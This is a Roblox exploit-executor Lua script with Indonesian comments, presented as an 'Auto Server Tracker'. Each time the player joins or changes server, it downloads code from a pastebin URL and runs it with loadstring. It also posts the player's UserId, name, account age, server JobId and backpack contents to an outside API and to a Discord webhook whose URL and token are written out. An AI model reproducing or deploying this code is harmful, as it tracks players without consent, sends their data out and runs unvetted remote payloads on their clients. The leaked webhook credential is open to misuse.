local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- ======= CONFIGURATION =======
local API_ENDPOINT = "https://api-beta-mocha-45.vercel.app/api/setInstanceId"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local EXTERNAL_SCRIPT = "https://pastebin.com/raw/pfpzbXiF"
-- =============================

local player = Players.LocalPlayer
local currentJobId = game.JobId
local playerName = player.Name

-- Improved HTTP request with retry logic
local function httpRequest(url, method, body, headers, retries)
    retries = retries or 3
    local requestFunc = syn and syn.request or http_request or request
    if not requestFunc then return nil end
    
    for i = 1, retries do
        local success, response = pcall(function()
            return requestFunc({
                Url = url,
                Method = method,
                Headers = headers or {
                    ["Content-Type"] = "application/json"
                },
                Body = body
            })
        end)
        
        if success and response then
            return response
        end
        wait(1) -- Wait before retrying
    end
    return nil
end

local function getBackpackContents()
    local contents = {}
    local backpack = player:FindFirstChild("Backpack")
    if not backpack then return "Backpack not found" end
    
    for _, item in ipairs(backpack:GetChildren()) do
        table.insert(contents, item.Name)
    end
    
    return #contents > 0 and table.concat(contents, ", ") or "Backpack empty"
end

local function executeExternalScript()
    local success, err = pcall(function()
        loadstring(game:HttpGet(EXTERNAL_SCRIPT, true))()
    end)
    if not success then
        warn("‚ö†Ô∏è Gagal mengeksekusi external script:", err)
    end
    return success
end

local function updateInstanceInDatabase()
    local data = {
        instanceId = currentJobId,
        player = {
            userId = player.UserId,
            name = player.Name,
            accountAge = player.AccountAge
        },
        timestamp = os.time()
    }
    
    local response = httpRequest(API_ENDPOINT, "POST", HttpService:JSONEncode(data))
    
    if response and response.StatusCode == 200 then
        print("‚úÖ Berhasil memperbarui instance ID di database:", currentJobId)
        return true
    else
        warn("‚ùå Gagal memperbarui instance ID:", response and response.StatusCode or "Tidak ada respon")
        return false
    end
end

local function sendServerChangeNotification()
    local embed = {
        username = "Server Tracker",
        embeds = {
            {
                title = "üîÑ Perubahan Server Terdeteksi",
                description = string.format("**%s** berpindah server\n**JobID Baru:** `%s`", playerName, currentJobId),
                color = 16776960, -- Yellow
                timestamp = DateTime.now():ToIsoDate(),
                fields = {
                    {
                        name = "üë§ Info Pemain",
                        value = string.format("UserID: %d", player.UserId),
                        inline = true
                    },
                    {
                        name = "üì¶ Isi Backpack",
                        value = getBackpackContents(),
                        inline = true
                    },
                    {
                        name = "üîÑ Status Script Eksternal",
                        value = executeExternalScript() and "Berhasil dijalankan" or "Gagal dijalankan",
                        inline = false
                    }
                },
                footer = {
                    text = "Auto Server Tracker v3.2"
                }
            }
        }
    }
    
    httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
end

-- Fungsi utama untuk menangani perubahan server
local function handleServerJoin()
    -- 1. Jalankan script eksternal secara asynchronous
    spawn(executeExternalScript)
    
    -- 2. Update instance ID di database (dengan retry)
    local attempts = 0
    local maxAttempts = 3
    local success = false
    
    while attempts < maxAttempts and not success do
        attempts += 1
        success = updateInstanceInDatabase()
        if not success then
            wait(2) -- Tunggu sebelum retry
        end
    end
    
    -- 3. Kirim notifikasi
    sendServerChangeNotification()
end

-- Sistem deteksi perubahan server
local function monitorServerChanges()
    local lastJobId = currentJobId
    
    while true do
        local newJobId = game.JobId
        if newJobId ~= lastJobId then
            print("üîÑ Mendeteksi perubahan server:", lastJobId, "‚Üí", newJobId)
            currentJobId = newJobId
            lastJobId = newJobId
            handleServerJoin() -- Proses perubahan server
        end
        wait(1) -- Cek setiap detik
    end
end

-- Eksekusi awal
local success, err = pcall(function()
    handleServerJoin() -- Jalankan untuk join awal
    monitorServerChanges() -- Mulai monitoring
end)

if not success then
    warn("‚ùå Error kritis dalam server tracker:", err)
end
